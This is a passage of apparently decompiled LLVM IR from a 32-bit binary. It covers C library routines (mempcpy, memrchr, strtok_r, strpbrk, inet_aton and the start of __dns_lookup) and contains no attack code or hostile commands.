  uselistorder i32 %v1_1889c, { 1, 0, 2 }
  uselistorder i32 %v0_1888081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_18870, { 1, 0 }
  uselistorder i32 %v0_188fc37, { 1, 2, 0 }
  uselistorder i32 %v1_18844, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18840, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18880, { 1, 0 }
  uselistorder label %dec_label_pc_18870, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18868, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18948 = call i32 @memcpy()
  %v0_1894c = load i32, i32* @r5, align 4
  %v1_1894c = load i32, i32* @r4, align 4
  %v2_1894c = add i32 %v1_1894c, %v0_1894c
  ret i32 %v2_1894c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18954 = load i32, i32* @r4, align 4
  %v1_18958 = urem i32 %arg2, 256
  %v2_1895c = add i32 %arg3, %arg1
  %v2_189742 = icmp eq i32 %arg3, 0
  br i1 %v2_189742, label %dec_label_pc_18984, label %dec_label_pc_1897c

dec_label_pc_18964:                               ; preds = %dec_label_pc_1897c
  %v1_18964 = add i32 %v0_18964, -1
  %v2_18964 = inttoptr i32 %v1_18964 to i8*
  %v3_18964 = load i8, i8* %v2_18964, align 1
  %v4_18964 = zext i8 %v3_18964 to i32
  %v9_18968 = icmp eq i32 %v4_18964, %v1_18958
  br i1 %v9_18968, label %bb, label %dec_label_pc_18974

bb:                                               ; preds = %dec_label_pc_18964
  ret i32 %v1_18964

dec_label_pc_18974:                               ; preds = %dec_label_pc_18964
  %v1_18970 = add i32 %v0_18970, -1
  %v2_18974 = icmp eq i32 %v1_18970, 0
  br i1 %v2_18974, label %dec_label_pc_18984, label %dec_label_pc_1897c

dec_label_pc_1897c:                               ; preds = %entry, %dec_label_pc_18974
  %v0_18970 = phi i32 [ %v1_18970, %dec_label_pc_18974 ], [ %arg3, %entry ]
  %v0_18964 = phi i32 [ %v1_18964, %dec_label_pc_18974 ], [ %v2_1895c, %entry ]
  %v1_1897c = urem i32 %v0_18964, 4
  %v2_1897c = icmp eq i32 %v1_1897c, 0
  br i1 %v2_1897c, label %dec_label_pc_18984, label %dec_label_pc_18964

dec_label_pc_18984:                               ; preds = %dec_label_pc_18974, %dec_label_pc_1897c, %entry
  %v0_18a1c11 = phi i32 [ %v2_1895c, %entry ], [ %v1_18964, %dec_label_pc_18974 ], [ %v0_18964, %dec_label_pc_1897c ]
  %v0_18a087 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18974 ], [ %v0_18970, %dec_label_pc_1897c ]
  %v4_18984 = mul nuw nsw i32 %v1_18958, 256
  %v5_18984 = or i32 %v4_18984, %v1_18958
  %v4_18988 = mul i32 %v5_18984, 65536
  %v5_18988 = or i32 %v4_18988, %v5_18984
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_18a087, 3
  br i1 %tmp, label %dec_label_pc_18990, label %dec_label_pc_18a18

dec_label_pc_18990:                               ; preds = %dec_label_pc_18984, %.backedge.backedge
  %v0_189ac51 = phi i32 [ %v1_189ac, %.backedge.backedge ], [ %v0_18a087, %dec_label_pc_18984 ]
  %v0_1899050 = phi i32 [ %v1_18990, %.backedge.backedge ], [ %v0_18a1c11, %dec_label_pc_18984 ]
  %v1_18990 = add i32 %v0_1899050, -4
  %v2_18990 = inttoptr i32 %v1_18990 to i32*
  %v3_18990 = load i32, i32* %v2_18990, align 4
  %v2_18994 = xor i32 %v3_18990, %v5_18988
  %v2_18998 = add i32 %v2_18994, 2130640639
  %v1_1899c = sub i32 -1, %v2_18994
  %v2_189a0 = xor i32 %v2_18998, %v1_1899c
  %v2_189a4 = and i32 %v2_189a0, -2130640640
  %v2_189a8 = icmp eq i32 %v2_189a4, 0
  %v1_189ac = add i32 %v0_189ac51, -4
  br i1 %v2_189a8, label %.backedge.backedge, label %dec_label_pc_189b4

dec_label_pc_189b4:                               ; preds = %dec_label_pc_18990
  %v1_189b4 = add i32 %v0_1899050, -1
  %v2_189b4 = inttoptr i32 %v1_189b4 to i8*
  %v3_189b4 = load i8, i8* %v2_189b4, align 1
  %v4_189b4 = zext i8 %v3_189b4 to i32
  %v9_189b8 = icmp eq i32 %v4_189b4, %v1_18958
  %v1_189bc = add i32 %v0_1899050, -2
  %v1_189c4 = add i32 %v0_1899050, -3
  store i32 %v1_189c4, i32* @lr, align 4
  br i1 %v9_189b8, label %dec_label_pc_189cc, label %dec_label_pc_189d4

dec_label_pc_189cc:                               ; preds = %dec_label_pc_189b4
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 %v1_189b4

dec_label_pc_189d4:                               ; preds = %dec_label_pc_189b4
  %v2_189d4 = inttoptr i32 %v1_189bc to i8*
  %v3_189d4 = load i8, i8* %v2_189d4, align 1
  %v4_189d4 = zext i8 %v3_189d4 to i32
  %v9_189d8 = icmp eq i32 %v4_189d4, %v1_18958
  br i1 %v9_189d8, label %dec_label_pc_189e0, label %dec_label_pc_189e8

dec_label_pc_189e0:                               ; preds = %dec_label_pc_189d4
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 %v1_189bc

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189d4
  %v2_189e8 = inttoptr i32 %v1_189c4 to i8*
  %v3_189e8 = load i8, i8* %v2_189e8, align 1
  %v4_189e8 = zext i8 %v3_189e8 to i32
  %v9_189ec = icmp eq i32 %v4_189e8, %v1_18958
  br i1 %v9_189ec, label %dec_label_pc_189f4, label %dec_label_pc_189fc

dec_label_pc_189f4:                               ; preds = %dec_label_pc_189e8
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 %v1_189c4

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189e8
  %v1_189fc = inttoptr i32 %v1_18990 to i8*
  %v2_189fc = load i8, i8* %v1_189fc, align 1
  %v3_189fc = zext i8 %v2_189fc to i32
  %v9_18a00 = icmp eq i32 %v3_189fc, %v1_18958
  br i1 %v9_18a00, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_189fc, %dec_label_pc_18990
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_189ac, 3
  br i1 %tmp70, label %dec_label_pc_18990, label %dec_label_pc_18a18

bb19:                                             ; preds = %dec_label_pc_189fc
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 %v1_18990

dec_label_pc_18a1c:                               ; preds = %dec_label_pc_18a18
  %v1_18a28 = add i32 %v0_18a28, -1
  %v1_18a1c = add i32 %v0_18a1c, -1
  %v2_18a1c = inttoptr i32 %v1_18a1c to i8*
  %v3_18a1c = load i8, i8* %v2_18a1c, align 1
  %v4_18a1c = zext i8 %v3_18a1c to i32
  %v9_18a20 = icmp eq i32 %v4_18a1c, %v1_18958
  br i1 %v9_18a20, label %bb20, label %dec_label_pc_18a18

bb20:                                             ; preds = %dec_label_pc_18a1c
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 %v1_18a1c

dec_label_pc_18a18:                               ; preds = %dec_label_pc_18984, %.backedge.backedge, %dec_label_pc_18a1c
  %v0_18a1c = phi i32 [ %v1_18a1c, %dec_label_pc_18a1c ], [ %v0_18a1c11, %dec_label_pc_18984 ], [ %v1_18990, %.backedge.backedge ]
  %v0_18a28 = phi i32 [ %v1_18a28, %dec_label_pc_18a1c ], [ %v0_18a087, %dec_label_pc_18984 ], [ %v1_189ac, %.backedge.backedge ]
  %v2_18a28 = icmp eq i32 %v0_18a28, 0
  br i1 %v2_18a28, label %dec_label_pc_18a30, label %dec_label_pc_18a1c

dec_label_pc_18a30:                               ; preds = %dec_label_pc_18a18
  store i32 %v3_18954, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_18a28, { 1, 0 }
  uselistorder i32 %v1_189ac, { 1, 0, 2 }
  uselistorder i32 %v1_18990, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1899050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18984, { 1, 0 }
  uselistorder i32 %v0_18a087, { 1, 2, 0 }
  uselistorder i32 %v0_18964, { 1, 0, 2 }
  uselistorder i32 %v1_18964, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1895c, { 1, 0 }
  uselistorder i32 %v1_18958, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18954, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18990, { 1, 0 }
  uselistorder label %dec_label_pc_18984, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1897c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18a40 = load i32, i32* @r4, align 4
  store i32 %v3_18a40, i32* %stack_var_-16, align 4
  %v6_18a40 = load i32, i32* @r5, align 4
  %v0_18a44 = load i32, i32* @r0, align 4
  store i32 %v0_18a44, i32* %r4.global-to-local, align 4
  %v2_18a44 = icmp eq i32 %v0_18a44, 0
  %v1_18a48 = load i32, i32* @r2, align 4
  br i1 %v2_18a44, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_18a48 = inttoptr i32 %v1_18a48 to i32*
  %v3_18a48 = load i32, i32* %v2_18a48, align 4
  store i32 %v3_18a48, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_18a4c = phi i32 [ %v3_18a48, %bb ], [ %v0_18a44, %entry ]
  store i32 %v0_18a4c, i32* @r0, align 4
  store i32 %v1_18a48, i32* @r5, align 4
  %v0_18a54 = load i32, i32* @r1, align 4
  store i32 %v0_18a54, i32* %r6.global-to-local, align 4
  %v1_18a58 = inttoptr i32 %v0_18a4c to i8*
  %v2_18a58 = call i32 @__GI_strspn(i8* %v1_18a58)
  %v0_18a5c = load i32, i32* %r4.global-to-local, align 4
  %v2_18a5c = add i32 %v0_18a5c, %v2_18a58
  %v3_18a5c = inttoptr i32 %v2_18a5c to i8*
  %v4_18a5c = load i8, i8* %v3_18a5c, align 1
  %v6_18a5c = zext i8 %v4_18a5c to i32
  store i32 %v6_18a5c, i32* %r3.global-to-local, align 4
  store i32 %v2_18a5c, i32* @r4, align 4
  %v2_18a64 = icmp eq i8 %v4_18a5c, 0
  store i1 %v2_18a64, i1* @cpsr_z, align 1
  %v0_18a68 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18a68, i32* @r1, align 4
  store i32 %v2_18a5c, i32* @r0, align 4
  br i1 %v2_18a64, label %bb7, label %dec_label_pc_18a78

bb7:                                              ; preds = %entry._crit_edge
  %v2_18a70 = load i32, i32* @r5, align 4
  %v3_18a70 = inttoptr i32 %v2_18a70 to i32*
  store i32 %v2_18a5c, i32* %v3_18a70, align 4
  br label %dec_label_pc_18aac

dec_label_pc_18a78:                               ; preds = %entry._crit_edge
  %v0_18a78 = call i32 @__GI_strpbrk()
  store i32 %v0_18a78, i32* %r2.global-to-local, align 4
  %v3_18a7c = icmp eq i32 %v0_18a78, 0
  store i1 %v3_18a7c, i1* @cpsr_z, align 1
  br i1 %v3_18a7c, label %dec_label_pc_18a8c, label %dec_label_pc_18a9c

dec_label_pc_18a8c:                               ; preds = %dec_label_pc_18a78
  %v0_18a84 = load i32, i32* @r4, align 4
  %v2_18a8c = call i32 @rawmemchr(i32 %v0_18a84, i32 0)
  %v0_18a90 = load i32, i32* @r4, align 4
  store i32 %v0_18a90, i32* %r3.global-to-local, align 4
  %v1_18a94 = load i32, i32* @r5, align 4
  %v2_18a94 = inttoptr i32 %v1_18a94 to i32*
  store i32 %v2_18a8c, i32* %v2_18a94, align 4
  br label %dec_label_pc_18aac

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a78
  %v3_18aa0 = inttoptr i32 %v0_18a78 to i8*
  store i8 0, i8* %v3_18aa0, align 1
  %v4_18aa0 = load i32, i32* %r2.global-to-local, align 4
  %v5_18aa0 = add i32 %v4_18aa0, 1
  store i32 %v5_18aa0, i32* @r2, align 4
  %v1_18aa4 = load i32, i32* @r5, align 4
  %v2_18aa4 = inttoptr i32 %v1_18aa4 to i32*
  store i32 %v5_18aa0, i32* %v2_18aa4, align 4
  %v0_18aa8 = load i32, i32* @r4, align 4
  store i32 %v0_18aa8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %bb7, %dec_label_pc_18a8c, %dec_label_pc_18a9c
  %v0_18aac = load i32, i32* %r3.global-to-local, align 4
  %v2_18ab0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18ab0, i32* @r4, align 4
  store i32 %v6_18a40, i32* @r5, align 4
  ret i32 %v0_18aac

; uselistorder directives
  uselistorder i32 %v0_18a4c, { 1, 0 }
  uselistorder i32 %v0_18a44, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_18aac, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_18ab4 = load i32, i32* @r0, align 4
  %v1_18ad82 = inttoptr i32 %v0_18ab4 to i8*
  %v2_18ad83 = load i8, i8* %v1_18ad82, align 1
  %v3_18ad84 = zext i8 %v2_18ad83 to i32
  %v2_18adc5 = icmp eq i8 %v2_18ad83, 0
  br i1 %v2_18adc5, label %dec_label_pc_18ad8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_18ae4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_18abc:                               ; preds = %dec_label_pc_18ac4
  %v1_18acc = add i32 %v0_18acc, 1
  %v9_18abc = icmp eq i32 %v3_18ac4, %v3_18ad86
  br i1 %v9_18abc, label %dec_label_pc_18aec, label %dec_label_pc_18ac4

dec_label_pc_18ac4:                               ; preds = %dec_label_pc_18abc, %bb
  %v0_18acc = phi i32 [ %v1_18acc, %dec_label_pc_18abc ], [ %v0_18ae4.pre, %bb ]
  %v1_18ac4 = inttoptr i32 %v0_18acc to i8*
  %v2_18ac4 = load i8, i8* %v1_18ac4, align 1
  %v3_18ac4 = zext i8 %v2_18ac4 to i32
  store i32 %v3_18ac4, i32* @ip, align 4
  %v2_18ac8 = icmp eq i8 %v2_18ac4, 0
  br i1 %v2_18ac8, label %dec_label_pc_18ad4, label %dec_label_pc_18abc

dec_label_pc_18ad4:                               ; preds = %dec_label_pc_18ac4
  %v1_18ad4 = add i32 %v0_18ad4, 1
  %v1_18ad8 = inttoptr i32 %v1_18ad4 to i8*
  %v2_18ad8 = load i8, i8* %v1_18ad8, align 1
  %v3_18ad8 = zext i8 %v2_18ad8 to i32
  %v2_18adc = icmp eq i8 %v2_18ad8, 0
  br i1 %v2_18adc, label %dec_label_pc_18ad8._crit_edge, label %bb

dec_label_pc_18ad8._crit_edge:                    ; preds = %dec_label_pc_18ad4, %entry
  %v3_18ad8.lcssa = phi i32 [ %v3_18ad84, %entry ], [ %v3_18ad8, %dec_label_pc_18ad4 ]
  ret i32 %v3_18ad8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_18ad4
  %v0_18ad4 = phi i32 [ %v0_18ab4, %.lr.ph ], [ %v1_18ad4, %dec_label_pc_18ad4 ]
  %v3_18ad86 = phi i32 [ %v3_18ad84, %.lr.ph ], [ %v3_18ad8, %dec_label_pc_18ad4 ]
  br label %dec_label_pc_18ac4

dec_label_pc_18aec:                               ; preds = %dec_label_pc_18abc
  ret i32 %v0_18ad4

; uselistorder directives
  uselistorder i32 %v3_18ad8, { 1, 0 }
  uselistorder i32 %v3_18ac4, { 1, 0 }
  uselistorder i32 %v0_18acc, { 1, 0 }
  uselistorder i32 %v3_18ad84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_18ac4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_18af4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18af4 = icmp eq i32 %v0_18af4, 0
  %v3_18af8 = load i32, i32* @r4, align 4
  store i32 %v3_18af8, i32* %stack_var_-20, align 4
  br i1 %v2_18af4, label %dec_label_pc_18bd4, label %dec_label_pc_18b10.lr.ph

dec_label_pc_18b10:                               ; preds = %dec_label_pc_18b10.lr.ph, %dec_label_pc_18b94
  %v1_18b94 = phi i32 [ 0, %dec_label_pc_18b10.lr.ph ], [ %v5_18b94, %dec_label_pc_18b94 ]
  %v0_18b98 = phi i32 [ 1, %dec_label_pc_18b10.lr.ph ], [ %v1_18b98, %dec_label_pc_18b94 ]
  %v0_18b18 = phi i32 [ %v0_18af4, %dec_label_pc_18b10.lr.ph ], [ %v0_18b1825, %dec_label_pc_18b94 ]
  store i32 %v2_18b14.pre, i32* @lr, align 4
  %v1_18b18 = inttoptr i32 %v0_18b18 to i8*
  %v2_18b18 = load i8, i8* %v1_18b18, align 1
  %v3_18b18 = zext i8 %v2_18b18 to i32
  %v3_18b1c = mul nuw nsw i32 %v3_18b18, 2
  %v4_18b1c = add i32 %v3_18b1c, %v2_18b14.pre
  %v5_18b1c = inttoptr i32 %v4_18b1c to i8*
  %v6_18b1c = load i8, i8* %v5_18b1c, align 1
  %v1_18b20 = and i8 %v6_18b1c, 8
  %v2_18b20 = icmp eq i8 %v1_18b20, 0
  br i1 %v2_18b20, label %dec_label_pc_18bd4, label %dec_label_pc_18b28

dec_label_pc_18b28:                               ; preds = %dec_label_pc_18b10
  br label %dec_label_pc_18b48

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18b48
  %v3_18b34 = mul i32 %v0_18b94, 10
  %v4_18b34 = add i32 %v3_18b48, %v3_18b34
  %v1_18b38 = add i32 %v4_18b34, -48
  %v8_18b40 = icmp sgt i32 %v1_18b38, 255
  br i1 %v8_18b40, label %dec_label_pc_18bd4, label %dec_label_pc_18b44

dec_label_pc_18b44:                               ; preds = %dec_label_pc_18b30
  %v1_18b44 = add i32 %v0_18b84, 1
  store i32 %v1_18b44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18b48

dec_label_pc_18b48:                               ; preds = %dec_label_pc_18b28, %dec_label_pc_18b44
  %v0_18b94 = phi i32 [ 0, %dec_label_pc_18b28 ], [ %v1_18b38, %dec_label_pc_18b44 ]
  %v0_18b84 = phi i32 [ %v0_18b18, %dec_label_pc_18b28 ], [ %v1_18b44, %dec_label_pc_18b44 ]
  %v1_18b48 = inttoptr i32 %v0_18b84 to i8*
  %v2_18b48 = load i8, i8* %v1_18b48, align 1
  %v3_18b48 = zext i8 %v2_18b48 to i32
  %v2_18b4c = mul nuw nsw i32 %v3_18b48, 2
  %v2_18b50 = add i32 %v2_18b4c, %v2_18b14.pre
  %v3_18b54 = inttoptr i32 %v2_18b50 to i8*
  %v4_18b54 = load i8, i8* %v3_18b54, align 1
  %v6_18b54 = zext i8 %v4_18b54 to i32
  %v1_18b60 = and i32 %v6_18b54, 8
  %v2_18b60 = icmp eq i32 %v1_18b60, 0
  br i1 %v2_18b60, label %dec_label_pc_18b68, label %dec_label_pc_18b30

dec_label_pc_18b68:                               ; preds = %dec_label_pc_18b48
  %v8_18b6c = icmp sgt i32 %v0_18b98, 3
  br i1 %v8_18b6c, label %dec_label_pc_18b80, label %dec_label_pc_18b70

dec_label_pc_18b70:                               ; preds = %dec_label_pc_18b68
  %v7_18b70 = icmp eq i8 %v2_18b48, 46
  br i1 %v7_18b70, label %dec_label_pc_18b78, label %dec_label_pc_18bd4

dec_label_pc_18b78:                               ; preds = %dec_label_pc_18b70
  %v1_18b78 = add i32 %v0_18b84, 1
  store i32 %v1_18b78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18b94

dec_label_pc_18b80:                               ; preds = %dec_label_pc_18b68
  %v2_18b80 = icmp eq i8 %v2_18b48, 0
  %v1_18b84 = add i32 %v0_18b84, 1
  store i32 %v1_18b84, i32* %r0.global-to-local, align 4
  br i1 %v2_18b80, label %dec_label_pc_18b94, label %dec_label_pc_18b8c

dec_label_pc_18b8c:                               ; preds = %dec_label_pc_18b80
  %v1_18b8c = and i32 %v6_18b54, 32
  %v2_18b8c = icmp eq i32 %v1_18b8c, 0
  br i1 %v2_18b8c, label %dec_label_pc_18bd4, label %dec_label_pc_18b94

dec_label_pc_18b94:                               ; preds = %dec_label_pc_18b8c, %dec_label_pc_18b80, %dec_label_pc_18b78
  %v0_18b1825 = phi i32 [ %v1_18b84, %dec_label_pc_18b8c ], [ %v1_18b84, %dec_label_pc_18b80 ], [ %v1_18b78, %dec_label_pc_18b78 ]
  %v4_18b94 = mul i32 %v1_18b94, 256
  %v5_18b94 = or i32 %v0_18b94, %v4_18b94
  %v1_18b98 = add nuw nsw i32 %v0_18b98, 1
  %v7_18ba0 = icmp slt i32 %v1_18b98, 5
  br i1 %v7_18ba0, label %dec_label_pc_18b10, label %dec_label_pc_18ba4

dec_label_pc_18b10.lr.ph:                         ; preds = %entry
  %v2_18b14.pre = load i32, i32* @global_var_264e8, align 4
  br label %dec_label_pc_18b10

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b94
  %v2_18ba4 = icmp eq i32 %arg2, 0
  br i1 %v2_18ba4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_18ba4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_18ba4
  %v3_18bc0 = call i32 @llvm.bswap.i32(i32 %v5_18b94)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18bcc = inttoptr i32 %arg2 to i32*
  store i32 %v3_18bc0, i32* %v3_18bcc, align 4
  %v2_18bd0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_18bd0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_18bd0 = phi i32 [ 1, %bb ], [ %v17_18bd0.pre, %bb41 ]
  %v2_18bd0 = phi i32 [ %v3_18af8, %bb ], [ %v2_18bd0.pre, %bb41 ]
  store i32 %v2_18bd0, i32* @r4, align 4
  ret i32 %v17_18bd0

dec_label_pc_18bd4:                               ; preds = %dec_label_pc_18b70, %dec_label_pc_18b8c, %dec_label_pc_18b10, %dec_label_pc_18b30, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_18af8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_18b14.pre, { 2, 1, 0 }
  uselistorder i32 %v1_18b98, { 1, 0 }
  uselistorder i32 %v0_18b84, { 0, 1, 3, 2 }
  uselistorder i32 %v3_18af8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_18bd4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18b48, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_18be0 = load i32, i32* @r4, align 4
  %v6_18be0 = load i32, i32* @r5, align 4
  %v9_18be0 = load i32, i32* @r6, align 4
  %v12_18be0 = load i32, i32* @r7, align 4
  %v15_18be0 = load i32, i32* @r8, align 4
  %v18_18be0 = load i32, i32* @sb, align 4
  %v21_18be0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_18c00 = call i32 @malloc(i32 512)
  store i32 %v1_18c00, i32* @r7, align 4
  %v1_18c0c = call i32 @malloc(i32 1025)
  %v2_18c10 = icmp eq i32 %v1_18c0c, 0
  br i1 %v2_18c10, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_18c14 = load i32, i32* @r7, align 4
  %v3_18c14 = icmp eq i32 %v1_18c14, 0
  store i32 %v1_18c0c, i32* %stack_var_-236, align 4
  br i1 %v3_18c14, label %bb195, label %dec_label_pc_18c28

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19308

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19308

dec_label_pc_18c28:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_18c2c = icmp eq i32 %arg3, 0
  br i1 %v2_18c2c, label %dec_label_pc_19308, label %dec_label_pc_18c34

dec_label_pc_18c34:                               ; preds = %dec_label_pc_18c28
  %v2_18c38 = load i8, i8* %arg1, align 1
  %v2_18c3c = icmp eq i8 %v2_18c38, 0
  br i1 %v2_18c3c, label %dec_label_pc_19308, label %dec_label_pc_18c44

dec_label_pc_18c44:                               ; preds = %dec_label_pc_18c34
  %v3_18c48 = call i32 @strlen(i8* nonnull %arg1)
  %v2_18c50 = add i32 %v3_18c48, %tmp
  %v1_18c54 = add i32 %v2_18c50, -1
  %v2_18c54 = inttoptr i32 %v1_18c54 to i8*
  %v3_18c54 = load i8, i8* %v2_18c54, align 1
  %v2_18c58 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18c58, i32* @r4, align 4
  %v7_18c5c = icmp eq i8 %v3_18c54, 46
  %. = zext i1 %v7_18c5c to i32
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_18c80 = call i32 @__pthread_return_void()
  %v1_18c90 = call i32 @__pthread_return_0()
  %v2_18c9c = load i32, i32* @global_var_2cad8.1133, align 4
  %v2_18ca0 = srem i32 %v2_18c9c, %arg3
  %v3_18ca8 = load i8, i8* @global_var_26829.1136, align 1
  %v4_18ca8 = zext i8 %v3_18ca8 to i32
  %v2_18cac = load i8, i8* bitcast (i8** @global_var_26828.1135 to i8*), align 4
  %v3_18cac = zext i8 %v2_18cac to i32
  %v4_18cb4 = mul nuw nsw i32 %v4_18ca8, 256
  %v5_18cb4 = or i32 %v3_18cac, %v4_18cb4
  store i32 %v5_18cb4, i32* @sb, align 4
  store i32 %v2_18ca0, i32* @sl, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_18cc8 = call i32 @__pthread_return_void()
  %v0_18cd4 = load i32, i32* @r5, align 4
  %v2_18cf4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_18d38 = bitcast i8* %stack_var_-188 to i32*
  %v2_18e18 = ptrtoint i32* %stack_var_-92 to i32
  %v3_18eb0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_18f14 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_19260 = icmp eq i1 %v7_18c5c, false
  %v7_18f68 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1904c = ptrtoint i32* %stack_var_-140 to i32
  %v9_19144 = icmp eq i32 %tmp147, %arg2
  %v7_190d8 = icmp eq i32 %arg2, 1
  %v2_19080 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_18cd4, 3
  br i1 %tmp292, label %dec_label_pc_18cdc.lr.ph.preheader.lr.ph, label %dec_label_pc_19314

dec_label_pc_18cdc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_18c44
  %v2_18fec = icmp eq i32 %tmp156, 0
  %v8_190dc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_18cdc.lr.ph.preheader

dec_label_pc_18cdc:                               ; preds = %dec_label_pc_18cdc.lr.ph, %dec_label_pc_192f8.backedge
  %v1_18ce4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_18cdc.lr.ph ], [ %v0_18e8c, %dec_label_pc_192f8.backedge ]
